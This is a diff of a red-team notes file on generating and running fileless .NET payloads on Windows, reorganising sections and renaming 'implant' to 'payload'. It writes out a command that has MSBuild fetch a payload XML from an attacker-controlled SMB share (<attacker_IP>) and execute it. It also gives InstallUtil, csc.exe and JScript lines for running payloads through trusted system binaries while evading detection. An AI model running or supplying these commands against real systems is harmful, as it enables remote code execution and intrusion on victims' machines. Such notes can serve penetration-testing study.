@@ -1,13 +1,25 @@
 # DotNET
 
-## MSBuild
+## 01 - Generate Payloads
+
+### 1.1 - Empire
+
+TODO: Fill this info
+
+UseStager
+
+CSharp payload
+
+MSFVenom
+
+### 1.2 - MSBuild Template
 
 > [!INFO] Valid Extensions
-> These are the valid extensions to execute fileless .NET implant. They are: `.csproj`, `.xml`, `.xoml`.
+> These are the valid extensions to execute fileless .NET payload. They are: `.csproj`, `.xml`, `.xoml`.
 > > [!TIP]
-> > You can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the implant.
+> > You can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the payload.
 
-XML Implant template.
+XML payload template.
 
 ```xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
@@ -36,25 +48,29 @@ XML Implant template.
 	</Project>
 ```
 
-To execute the .NET implant.
+## 02 - Execute Payloads
+
+### 2.1 - MSBuild
+
+To execute the .NET payload.
 
 ```
-C:\> cmd.exe /V /c "set COMPILER="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !COMPILER! /noautoresponse /preprocess \\<attacker_IP>\<share_name>\implant.xml > implant.xml & !COMPILER! implant.xml"
+C:\> cmd.exe /V /c "set COMPILER="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !COMPILER! /noautoresponse /preprocess \\<attacker_IP>\<share_name>\payload.xml > payload.xml & !COMPILER! payload.xml"
 ```
 
-## InstallUtil
+### 2.2 - InstallUtil
 
 ```
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\implant.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\payload.exe
 ```
 
-## CSC
+### 2.3 - CSC
 
 ```
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\path\to\implant.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\path\to\payload.cs
 ```
 
-## JScript
+### 2.4 - JScript
 
 ```powershell
 [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');
